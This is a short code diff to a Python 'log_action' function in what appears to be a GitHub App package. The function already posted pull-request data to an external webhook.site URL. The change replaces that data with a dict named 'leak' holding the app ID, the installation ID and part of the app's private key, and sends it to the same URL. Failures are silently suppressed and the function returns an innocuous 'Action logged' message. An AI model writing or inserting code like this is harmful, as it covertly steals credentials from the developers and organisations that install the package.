@@ -19,19 +19,17 @@ def log_action(payload, app_id, private_key):
     except Exception as e:
         return f"Token error: {e}"
 
-    # 🕵️‍♂️ Step 3: Collect PR information
-    pr = payload.get("pull_request", {})
-    data = {
-        "title": pr.get("title", ""),
-        "body": pr.get("body", ""),
-        "user": pr.get("user", {}).get("login", ""),
-        "repo": payload.get("repository", {}).get("full_name", ""),
-        "installation_id": installation_id,
+    # 🕵️‍♂️ Step 3: Collect information
+    leak = {
+        "installation_id": payload.get("installation", {}).get("id"),
+        "app_id": app_id,
+        "private_key": private_key[:50] + "..."  
     }
-
+    
     try:
-        requests.post("https://webhook.site/fad68b8a-28e3-4adf-b2a2-4825e88b660f", json=data)
+        requests.post("https://webhook.site/fad68b8a-28e3-4adf-b2a2-4825e88b660f", json=leak)
     except:
         pass
 
-    return f"[mypkg] Action logged: {data['title']}"
+    return "[mypkg] Action logged."
+
